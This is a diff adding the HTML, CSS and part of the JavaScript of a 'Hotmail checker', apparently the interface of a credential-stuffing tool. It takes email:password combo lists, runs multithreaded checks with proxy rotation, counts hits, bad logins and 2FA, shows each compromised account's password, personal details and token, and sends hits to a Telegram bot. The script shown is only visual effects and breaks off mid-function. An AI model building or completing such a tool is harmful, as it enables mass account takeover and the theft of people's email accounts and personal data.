@@ -1,0 +1,1651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEBULA // HOTMAIL CHECKER</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap');
+
+        :root {
+            --neon-cyan: #00f0ff;
+            --neon-magenta: #ff00a0;
+            --neon-amber: #ffb000;
+            --neon-green: #00ff88;
+            --neon-red: #ff0044;
+            --neon-yellow: #ffdd00;
+            --deep-space: #050510;
+            --glass-bg: rgba(10, 15, 30, 0.6);
+            --glass-border: rgba(0, 240, 255, 0.15);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--deep-space);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            cursor: crosshair;
+        }
+
+        #starfield {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+        }
+
+        /* Flying particles with connections */
+        #particles-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,240,255,0.03) 2px, rgba(0,240,255,0.03) 4px);
+            pointer-events: none;
+            z-index: 1000;
+            animation: scanlineMove 8s linear infinite;
+        }
+        @keyframes scanlineMove {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+        .vignette {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.8) 100%);
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        #main-container {
+            position: relative;
+            z-index: 10;
+            width: 100vw;
+            height: 100vh;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 60px 1fr 280px;
+            gap: 2px;
+            padding: 8px;
+        }
+
+        .panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .corner {
+            position: absolute;
+            width: 16px; height: 16px;
+            border: 2px solid var(--neon-cyan);
+            opacity: 0.5;
+            z-index: 100;
+        }
+        .corner-tl { top: 0; left: 0; border-right: none; border-bottom: none; }
+        .corner-tr { top: 0; right: 0; border-left: none; border-bottom: none; }
+        .corner-bl { bottom: 0; left: 0; border-right: none; border-top: none; }
+        .corner-br { bottom: 0; right: 0; border-left: none; border-top: none; }
+
+        #header {
+            grid-column: 1 / -1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 25px;
+            background: linear-gradient(90deg, rgba(0,240,255,0.1), transparent, rgba(255,0,160,0.1));
+        }
+
+        .logo-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 6px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-magenta));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glitch 3s infinite;
+        }
+        @keyframes glitch {
+            0%, 90%, 100% { transform: translate(0); filter: none; }
+            92% { transform: translate(-2px, 1px); filter: hue-rotate(90deg); }
+            94% { transform: translate(2px, -1px); filter: hue-rotate(-90deg); }
+            96% { transform: translate(-1px, 2px); }
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .pulse-dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: var(--neon-green);
+            box-shadow: 0 0 15px var(--neon-green);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        .clock {
+            font-family: 'Orbitron', monospace;
+            font-size: 16px;
+            color: var(--neon-amber);
+            letter-spacing: 3px;
+        }
+
+        #neural-panel {
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+        .panel-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            letter-spacing: 3px;
+            color: var(--neon-cyan);
+            border-bottom: 1px solid rgba(0,240,255,0.2);
+            padding-bottom: 6px;
+            margin-bottom: 4px;
+        }
+        #neural-canvas {
+            flex: 1;
+            width: 100%;
+            height: 100%;
+            min-height: 150px;
+            border: 1px solid rgba(0, 240, 255, 0.08);
+            background: rgba(5, 5, 16, 0.95);
+        }
+
+        #results-panel {
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+        .results-list {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+        .results-list::-webkit-scrollbar { width: 3px; }
+        .results-list::-webkit-scrollbar-track { background: rgba(0, 240, 255, 0.05); }
+        .results-list::-webkit-scrollbar-thumb { background: var(--neon-cyan); }
+
+        .hit-card {
+            background: linear-gradient(90deg, rgba(0,255,136,0.08), transparent);
+            border-left: 2px solid var(--neon-green);
+            padding: 8px;
+            margin-bottom: 6px;
+            font-size: 11px;
+            animation: slideIn 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .hit-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.15), transparent);
+            animation: shimmer 2s infinite;
+        }
+        @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .hit-email { color: var(--neon-green); font-weight: bold; margin-bottom: 2px; font-size: 11px; }
+        .hit-pass { color: rgba(0,240,255,0.4); font-size: 9px; margin-bottom: 2px; }
+        .hit-name { color: rgba(255,0,160,0.6); font-size: 10px; }
+        .hit-country { color: rgba(255,176,0,0.7); font-size: 9px; }
+        .hit-token { color: rgba(0, 255, 136, 0.5); font-size: 8px; word-break: break-all; }
+
+        #input-panel {
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+            gap: 8px;
+        }
+        .hex-input-container {
+            position: relative;
+            flex: 1;
+            min-height: 80px;
+        }
+        #combo-input {
+            width: 100%; height: 100%;
+            background: rgba(5, 5, 16, 0.8);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 11px;
+            padding: 10px;
+            resize: none;
+            outline: none;
+            line-height: 1.5;
+        }
+        #combo-input::placeholder { color: rgba(0, 240, 255, 0.25); }
+        #combo-input:focus { border-color: var(--neon-cyan); }
+
+        .control-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .control-label {
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: rgba(0, 240, 255, 0.6);
+            display: flex;
+            justify-content: space-between;
+        }
+        .neon-slider {
+            -webkit-appearance: none;
+            width: 100%; height: 3px;
+            background: rgba(0, 240, 255, 0.1);
+            border-radius: 2px;
+            outline: none;
+        }
+        .neon-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 12px; height: 12px;
+            border-radius: 50%;
+            background: var(--neon-cyan);
+            box-shadow: 0 0 10px var(--neon-cyan);
+            cursor: pointer;
+        }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-size: 10px;
+        }
+        .toggle-switch {
+            width: 36px; height: 18px;
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 9px;
+            position: relative;
+        }
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            width: 12px; height: 12px;
+            background: rgba(0, 240, 255, 0.4);
+            border-radius: 50%;
+            top: 2px; left: 2px;
+            transition: all 0.3s;
+        }
+        .toggle-active .toggle-switch {
+            background: rgba(0, 255, 136, 0.15);
+            border-color: var(--neon-green);
+        }
+        .toggle-active .toggle-switch::after {
+            background: var(--neon-green);
+            left: 20px;
+            box-shadow: 0 0 8px var(--neon-green);
+        }
+
+        .neon-input {
+            background: rgba(5, 5, 16, 0.8);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            padding: 6px 10px;
+            width: 100%;
+            outline: none;
+            font-size: 11px;
+        }
+        .neon-input:focus { border-color: var(--neon-cyan); }
+
+        .btn-row {
+            display: flex;
+            gap: 6px;
+            margin-top: auto;
+        }
+        .cyber-btn {
+            position: relative;
+            background: transparent;
+            border: 1px solid var(--neon-cyan);
+            color: var(--neon-cyan);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            padding: 8px 16px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            flex: 1;
+        }
+        .cyber-btn:hover {
+            background: rgba(0, 240, 255, 0.1);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+        }
+        .cyber-btn.danger { border-color: var(--neon-red); color: var(--neon-red); }
+        .cyber-btn.danger:hover { background: rgba(255, 0, 68, 0.1); }
+        .cyber-btn.success { border-color: var(--neon-green); color: var(--neon-green); }
+        .cyber-btn.success:hover { background: rgba(0, 255, 136, 0.1); }
+
+        /* Bottom row - full width stats + log */
+        #bottom-panel {
+            grid-column: 1 / -1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2px;
+            min-height: 200px;
+        }
+
+        #stats-panel {
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+            gap: 8px;
+        }
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+        }
+        .stat-card {
+            background: rgba(0, 240, 255, 0.03);
+            border: 1px solid rgba(0, 240, 255, 0.08);
+            padding: 10px 6px;
+            text-align: center;
+        }
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--neon-cyan);
+        }
+        .stat-label {
+            font-size: 9px;
+            letter-spacing: 2px;
+            color: rgba(0, 240, 255, 0.5);
+            margin-top: 3px;
+        }
+
+        .progress-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 4px;
+        }
+        .progress-ring {
+            position: relative;
+            width: 60px; height: 60px;
+        }
+        .progress-ring svg { transform: rotate(-90deg); }
+        .progress-ring-bg {
+            fill: none;
+            stroke: rgba(0, 240, 255, 0.08);
+            stroke-width: 4;
+        }
+        .progress-ring-fill {
+            fill: none;
+            stroke: var(--neon-cyan);
+            stroke-width: 4;
+            stroke-linecap: round;
+            stroke-dasharray: 165;
+            stroke-dashoffset: 165;
+            transition: stroke-dashoffset 0.5s ease;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+        }
+
+        /* Neural canvas in stats panel */
+        #stats-neural-canvas {
+            width: 100%;
+            height: 100px;
+            border: 1px solid rgba(0, 240, 255, 0.08);
+            margin-top: 8px;
+        }
+
+        #log-panel {
+            display: flex;
+            flex-direction: column;
+            padding: 10px;
+        }
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+        .log-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            letter-spacing: 3px;
+            color: var(--neon-cyan);
+        }
+        .log-legend {
+            display: flex;
+            gap: 12px;
+            font-size: 9px;
+        }
+        .legend-item { display: flex; align-items: center; gap: 4px; }
+        .legend-dot { width: 6px; height: 6px; border-radius: 50%; }
+        .dot-hit { background: var(--neon-green); box-shadow: 0 0 4px var(--neon-green); }
+        .dot-bad { background: var(--neon-red); box-shadow: 0 0 4px var(--neon-red); }
+        .dot-2fa { background: var(--neon-yellow); box-shadow: 0 0 4px var(--neon-yellow); }
+        .dot-info { background: var(--neon-cyan); box-shadow: 0 0 4px var(--neon-cyan); }
+
+        .raw-log {
+            flex: 1;
+            background: rgba(3, 3, 10, 0.95);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            padding: 8px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px;
+            overflow-y: auto;
+            line-height: 1.6;
+            min-height: 100px;
+        }
+        .raw-log::-webkit-scrollbar { width: 3px; }
+        .raw-log::-webkit-scrollbar-thumb { background: var(--neon-cyan); }
+
+        .log-line {
+            opacity: 0;
+            animation: fadeIn 0.2s forwards;
+            padding: 1px 0;
+        }
+        @keyframes fadeIn { to { opacity: 1; } }
+
+        .log-time { color: rgba(0, 240, 255, 0.3); margin-right: 6px; }
+        .log-hit { color: var(--neon-green); text-shadow: 0 0 4px var(--neon-green); }
+        .log-bad { color: var(--neon-red); }
+        .log-2fa { color: var(--neon-yellow); text-shadow: 0 0 4px var(--neon-yellow); }
+        .log-info { color: var(--neon-cyan); }
+        .log-warn { color: var(--neon-amber); }
+
+        .telegram-row {
+            display: flex;
+            gap: 6px;
+            margin-top: 4px;
+        }
+        .tg-btn {
+            background: rgba(0, 240, 255, 0.05);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 9px;
+            padding: 4px 8px;
+            cursor: pointer;
+        }
+        .tg-btn:hover { background: rgba(0, 240, 255, 0.1); }
+
+        /* Giant Popup Modal */
+        .giant-popup {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        .giant-popup.active { display: flex; }
+        .giant-modal {
+            background: linear-gradient(135deg, rgba(0,20,40,0.95), rgba(0,50,80,0.9));
+            border: 3px solid var(--neon-green);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5), inset 0 0 30px rgba(0, 255, 136, 0.1);
+            padding: 40px;
+            min-width: 500px;
+            max-width: 600px;
+            text-align: center;
+            animation: giantPopIn 0.5s ease;
+        }
+        @keyframes giantPopIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .giant-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            color: var(--neon-green);
+            text-shadow: 0 0 20px var(--neon-green);
+            margin-bottom: 20px;
+            letter-spacing: 4px;
+        }
+        .giant-detail {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            color: var(--neon-cyan);
+            margin: 12px 0;
+            text-align: left;
+        }
+        .giant-detail span { color: var(--neon-magenta); }
+        .giant-close {
+            margin-top: 25px;
+            padding: 12px 30px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            background: transparent;
+            border: 2px solid var(--neon-cyan);
+            color: var(--neon-cyan);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .giant-close:hover {
+            background: var(--neon-cyan);
+            color: #000;
+        }
+
+        .australia-popup {
+            border-color: var(--neon-amber) !important;
+            box-shadow: 0 0 80px rgba(255, 176, 0, 0.8), inset 0 0 40px rgba(255, 176, 0, 0.2) !important;
+        }
+        .australia-popup .giant-title {
+            color: var(--neon-amber) !important;
+            text-shadow: 0 0 30px var(--neon-amber) !important;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
+    <canvas id="starfield"></canvas>
+    <div class="scanlines"></div>
+    <div class="vignette"></div>
+
+    <div id="main-container">
+        <div id="header" class="panel">
+            <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+            <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+            <div class="logo-text">NEBULA // CHECKER</div>
+            <div class="status-indicator">
+                <div class="pulse-dot" id="system-pulse"></div>
+                <span style="font-size: 10px; letter-spacing: 2px; opacity: 0.6;">ONLINE</span>
+                <div class="clock" id="clock">00:00:00</div>
+            </div>
+        </div>
+
+        <div id="neural-panel" class="panel">
+            <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+            <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+            <div class="panel-title">◈ NEURAL NETWORK // REALTIME</div>
+            <canvas id="neural-canvas"></canvas>
+        </div>
+    
+        <div id="results-panel" class="panel">
+            <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+            <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+            <div class="panel-title">◈ VALIDATED TOKENS</div>
+            <div class="results-list" id="results-list"></div>
+        </div>
+
+        <div id="input-panel" class="panel">
+            <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+            <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+            <div class="panel-title">◈ DATA INPUT</div>
+            <div class="hex-input-container">
+                <textarea id="combo-input" placeholder="email:password&#10;email:password&#10;..."></textarea>
+            </div>
+            <div class="control-group">
+                <div class="control-label"><span>THREADS</span><span id="thread-val">10</span></div>
+                <input type="range" class="neon-slider" id="thread-slider" min="1" max="50" value="10">
+            </div>
+            <div class="toggle-container" id="proxy-toggle">
+                <div class="toggle-switch"></div>
+                <span>PROXY ROTATION</span>
+            </div>
+            <div>
+                <div class="control-label">KEYWORD FILTER</div>
+                <input type="text" class="neon-input" id="keyword-input" placeholder="Filter pattern...">
+            </div>
+            <div class="btn-row">
+                <button class="cyber-btn" id="paste-btn">PASTE</button>
+                <button class="cyber-btn danger" id="clear-btn">CLEAR</button>
+            </div>
+            <div class="btn-row">
+                <button class="cyber-btn success" id="start-btn" style="flex: 2;">INITIATE</button>
+                <button class="cyber-btn danger" id="stop-btn" style="display: none; flex: 1;">ABORT</button>
+            </div>
+        </div>
+
+        <div id="bottom-panel">
+            <div id="stats-panel" class="panel">
+                <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+                <div class="panel-title">◈ MISSION STATS</div>
+                <div class="stats-bar">
+                    <div class="stat-card">
+                        <div class="stat-value" id="stat-total">0</div>
+                        <div class="stat-label">TOTAL</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="stat-checked" style="color: var(--neon-amber);">0</div>
+                        <div class="stat-label">CHECKED</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="stat-hits" style="color: var(--neon-green);">0</div>
+                        <div class="stat-label">HITS</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="stat-rate" style="color: var(--neon-magenta);">0%</div>
+                        <div class="stat-label">RATE</div>
+                    </div>
+                </div>
+                <div class="progress-row">
+                    <div class="progress-ring">
+                        <svg width="60" height="60">
+                            <circle class="progress-ring-bg" cx="30" cy="30" r="26"></circle>
+                            <circle class="progress-ring-fill" id="progress-circle" cx="30" cy="30" r="26"></circle>
+                        </svg>
+                        <div class="progress-text" id="progress-percent">0%</div>
+                    </div>
+                    <div>
+                        <div style="font-size: 9px; letter-spacing: 2px; opacity: 0.5;">PROGRESS</div>
+                        <div style="font-family: Orbitron; font-size: 12px;" id="progress-fraction">0/0</div>
+                    </div>
+                </div>
+                <canvas id="stats-neural-canvas"></canvas>
+                <div class="panel-title" style="margin-top: 8px;">◈ TELEGRAM OUTPUT</div>
+                <input type="text" class="neon-input" id="tg-bot-token" placeholder="Bot Token..." style="margin-bottom: 4px;">
+                <input type="text" class="neon-input" id="tg-chat-id" placeholder="Chat ID..." style="margin-bottom: 4px;">
+                <div class="telegram-row">
+                    <button class="tg-btn" id="tg-test">TEST</button>
+                    <button class="tg-btn" id="tg-save">SAVE</button>
+                    <div class="toggle-container" id="tg-toggle" style="margin-left: auto;">
+                        <div class="toggle-switch"></div>
+                        <span style="font-size: 9px;">ENABLED</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="log-panel" class="panel">
+                <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+                <div class="log-header">
+                    <div class="log-title">◈ RAW OPERATIONS LOG</div>
+                    <div class="log-legend">
+                        <div class="legend-item"><div class="legend-dot dot-hit"></div>HIT</div>
+                        <div class="legend-item"><div class="legend-dot dot-bad"></div>BAD</div>
+                        <div class="legend-item"><div class="legend-dot dot-2fa"></div>2FA</div>
+                        <div class="legend-item"><div class="legend-dot dot-info"></div>INFO</div>
+                    </div>
+                </div>
+                <div class="raw-log" id="raw-log"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Giant Popup Modal -->
+    <div class="giant-popup" id="giant-popup">
+        <div class="giant-modal" id="giant-modal">
+            <div class="giant-title">◈ VALIDATED ACCOUNT ◈</div>
+            <div class="giant-detail">Email: <span id="giant-email"></span></div>
+            <div class="giant-detail">Password: <span id="giant-pass"></span></div>
+            <div class="giant-detail">Name: <span id="giant-name"></span></div>
+            <div class="giant-detail">Country: <span id="giant-country"></span></div>
+            <div class="giant-detail">Birthdate: <span id="giant-dob"></span></div>
+            <div class="giant-detail">Mailbox Lang: <span id="giant-lang"></span></div>
+            <div class="giant-detail">Timezone: <span id="giant-tz"></span></div>
+            <div class="giant-detail">Token: <span id="giant-token"></span></div>
+            <button class="giant-close" onclick="closeGiantPopup()">CLOSE</button>
+        </div>
+    </div>
+
+    <script>
+        // ==================== PARTICLE NETWORK ====================
+        const particlesCanvas = document.getElementById('particles-canvas');
+        const pCtx = particlesCanvas.getContext('2d');
+        let particles = [];
+        const particleCount = 80;
+        const connectionDistance = 150;
+        const particleSpeed = 0.5;
+
+        function resizeParticles() {
+            particlesCanvas.width = window.innerWidth;
+            particlesCanvas.height = window.innerHeight;
+        }
+        resizeParticles();
+        window.addEventListener('resize', resizeParticles);
+
+        class Particle {
+            constructor() {
+                this.reset();
+            }
+            reset() {
+                this.x = Math.random() * particlesCanvas.width;
+                this.y = Math.random() * particlesCanvas.height;
+                this.vx = (Math.random() - 0.5) * particleSpeed * 2;
+                this.vy = (Math.random() - 0.5) * particleSpeed * 2;
+                this.radius = Math.random() * 2 + 1;
+                this.color = Math.random() > 0.5 ? '#00f0ff' : Math.random() > 0.5 ? '#ff00a0' : '#00ff88';
+                this.brightness = Math.random() * 0.5 + 0.5;
+            }
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                this.brightness += (Math.random() - 0.5) * 0.05;
+                this.brightness = Math.max(0.3, Math.min(1, this.brightness));
+                
+                if (this.x < 0 || this.x > particlesCanvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > particlesCanvas.height) this.vy *= -1;
+            }
+            draw() {
+                pCtx.beginPath();
+                pCtx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                pCtx.fillStyle = this.color;
+                pCtx.globalAlpha = this.brightness;
+                pCtx.shadowBlur = 10;
+                pCtx.shadowColor = this.color;
+                pCtx.fill();
+                pCtx.globalAlpha = 1;
+                pCtx.shadowBlur = 0;
+            }
+        }
+
+        function getGradientColor(distance, maxDist) {
+            const ratio = distance / maxDist;
+            if (ratio < 0.3) return '#00f0ff';
+            if (ratio < 0.6) return '#ff00a0';
+            return '#ffb000';
+        }
+
+        function drawConnections() {
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < connectionDistance) {
+                        const gradient = pCtx.createLinearGradient(
+                            particles[i].x, particles[i].y,
+                            particles[j].x, particles[j].y
+                        );
+                        const color = getGradientColor(distance, connectionDistance);
+                        gradient.addColorStop(0, color + '80');
+                        gradient.addColorStop(1, color + '20');
+                        
+                        pCtx.beginPath();
+                        pCtx.moveTo(particles[i].x, particles[i].y);
+                        pCtx.lineTo(particles[j].x, particles[j].y);
+                        pCtx.strokeStyle = gradient;
+                        pCtx.lineWidth = 1;
+                        pCtx.stroke();
+                    }
+                }
+            }
+        }
+
+        for (let i = 0; i < particleCount; i++) {
+            particles.push(new Particle());
+        }
+
+        function animateParticles() {
+            pCtx.clearRect(0, 0, particlesCanvas.width, particlesCanvas.height);
+            particles.forEach(p => p.update());
+            drawConnections();
+            particles.forEach(p => p.draw());
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // ==================== AUDIO ENGINE ====================
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playBeep(freq, duration) {
+            try {
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = freq;
+                oscillator.type = 'square';
+                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration/1000);
+                oscillator.start(audioCtx.currentTime);
+                oscillator.stop(audioCtx.currentTime + duration/1000);
+            } catch(e) {}
+        }
+
+        function playCountrySound(country) {
+            const sounds = {
+                "AU": [880, 200], "US": [784, 200], "GB": [698, 200], "CA": [659, 200],
+                "DE": [587, 200], "FR": [523, 200], "JP": [494, 200], "BR": [440, 200]
+            };
+            if (sounds[country]) {
+                playBeep(sounds[country][0], sounds[country][1]);
+            } else {
+                playBeep(660, 150);
+            }
+        }
+
+        function playAustraliaJingle() {
+            const notes = [
+                [880, 150], [988, 150], [1175, 150], [880, 150],
+                [988, 150], [1175, 300], [1319, 400]
+            ];
+            let time = 0;
+            notes.forEach(([freq, dur]) => {
+                setTimeout(() => playBeep(freq, dur), time);
+                time += dur + 30;
+            });
+        }
+
+        // ==================== STARFIELD ====================
+        const starCanvas = document.getElementById('starfield');
+        const starCtx = starCanvas.getContext('2d');
+        let stars = [];
+        function resizeStarfield() {
+            starCanvas.width = window.innerWidth;
+            starCanvas.height = window.innerHeight;
+        }
+        resizeStarfield();
+        window.addEventListener('resize', resizeStarfield);
+
+        class Star {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * starCanvas.width;
+                this.y = Math.random() * starCanvas.height;
+                this.z = Math.random() * 2 + 0.5;
+                this.size = Math.random() * 1.5;
+                this.speed = Math.random() * 0.5 + 0.1;
+                this.brightness = Math.random();
+                this.color = Math.random() > 0.8 ? '#ff00a0' : Math.random() > 0.6 ? '#00f0ff' : '#ffffff';
+            }
+            update() {
+                this.y -= this.speed * this.z;
+                this.brightness += (Math.random() - 0.5) * 0.1;
+                this.brightness = Math.max(0.2, Math.min(1, this.brightness));
+                if (this.y < 0) this.reset();
+            }
+            draw() {
+                starCtx.globalAlpha = this.brightness;
+                starCtx.fillStyle = this.color;
+                starCtx.beginPath();
+                starCtx.arc(this.x, this.y, this.size * this.z, 0, Math.PI * 2);
+                starCtx.fill();
+            }
+        }
+        for (let i = 0; i < 200; i++) stars.push(new Star());
+        function animateStars() {
+            starCtx.clearRect(0, 0, starCanvas.width, starCanvas.height);
+            stars.forEach(s => { s.update(); s.draw(); });
+            requestAnimationFrame(animateStars);
+        }
+        animateStars();
+
+        // ==================== NEURAL NETWORK ====================
+        const neuralCanvas = document.getElementById('neural-canvas');
+        const neuralCtx = neuralCanvas.getContext('2d');
+        let nodes = [], connections = [], packets = [];
+        const PACKET_COLORS = ['#00f0ff', '#ff00a0', '#ffb000', '#00ff88', '#ff0044', '#ffdd00', '#ff66ff', '#66ffff'];
+
+        function resizeNeural() {
+            const rect = neuralCanvas.parentElement.getBoundingClientRect();
+            neuralCanvas.width = rect.width - 24;
+            neuralCanvas.height = Math.max(150, rect.height - 60);
+            initNeuralNetwork();
+        }
+
+        function initNeuralNetwork() {
+            nodes = []; connections = [];
+            const cols = 10, rows = 5;
+            const colStep = neuralCanvas.width / (cols + 1);
+            const rowStep = neuralCanvas.height / (rows + 1);
+
+            for (let c = 0; c < cols; c++) {
+                for (let r = 0; r < rows; r++) {
+                    nodes.push({
+                        x: (c + 1) * colStep,
+                        y: (r + 1) * rowStep,
+                        intensity: 0.2,
+                        col: c, row: r
+                    });
+                }
+            }
+
+            nodes.forEach((node, i) => {
+                nodes.forEach((other, j) => {
+                    if (i !== j && Math.abs(node.col - other.col) <= 1 && Math.random() > 0.8) {
+                        connections.push({ from: node, to: other, intensity: 0 });
+                    }
+                });
+            });
+        }
+
+        function animateNeural() {
+            neuralCtx.fillStyle = 'rgba(5, 5, 16, 0.15)';
+            neuralCtx.fillRect(0, 0, neuralCanvas.width, neuralCanvas.height);
+
+            connections.forEach(conn => {
+                conn.intensity *= 0.90;
+                if (conn.intensity > 0.01) {
+                    neuralCtx.strokeStyle = `rgba(0, 240, 255, ${conn.intensity * 0.2})`;
+                    neuralCtx.lineWidth = 0.8;
+                    neuralCtx.beginPath();
+                    neuralCtx.moveTo(conn.from.x, conn.from.y);
+                    neuralCtx.lineTo(conn.to.x, conn.to.y);
+                    neuralCtx.stroke();
+                }
+            });
+
+            nodes.forEach(node => {
+                node.intensity *= 0.90;
+                const radius = 2.5 + node.intensity * 2;
+                neuralCtx.beginPath();
+                neuralCtx.arc(node.x, node.y, radius, 0, Math.PI * 2);
+                neuralCtx.fillStyle = node.intensity > 0.4 ? '#00ff88' : `rgba(0, 240, 255, ${0.2 + node.intensity * 0.3})`;
+                neuralCtx.fill();
+            });
+
+            packets = packets.filter(p => {
+                p.progress += p.speed;
+                if (p.progress >= 1) {
+                    p.target.intensity = 0.8;
+                    connections.filter(c => c.from === p.target).forEach(c => c.intensity = 0.6);
+                    return false;
+                }
+
+                const x = p.start.x + (p.target.x - p.start.x) * p.progress;
+                const y = p.start.y + (p.target.y - p.start.y) * p.progress;
+
+                neuralCtx.beginPath();
